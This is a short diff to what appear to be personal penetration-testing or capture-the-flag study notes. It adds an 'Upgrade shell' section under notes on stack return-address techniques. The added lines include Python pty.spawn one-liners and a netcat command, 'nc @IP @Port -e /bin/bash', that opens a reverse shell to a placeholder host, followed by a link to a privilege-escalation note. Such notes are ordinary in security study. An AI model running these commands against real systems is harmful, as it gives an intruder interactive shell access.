@@ -134,4 +134,10 @@ ret to ret
 ret to ptr
 	registers hold addresses on the stack we can control 
 	
+Upgrade shell : 
+	python3 -c "import pty; pty.spawn('/bin/bash')" (check what version of python is installed or install python)
+	python -c "import pty; pty.spawn('/bin/bash')"
+	nc @IP @Port -e /bin/bash
 	
+ [[Privilege escalation#^ebeddb]]
+		
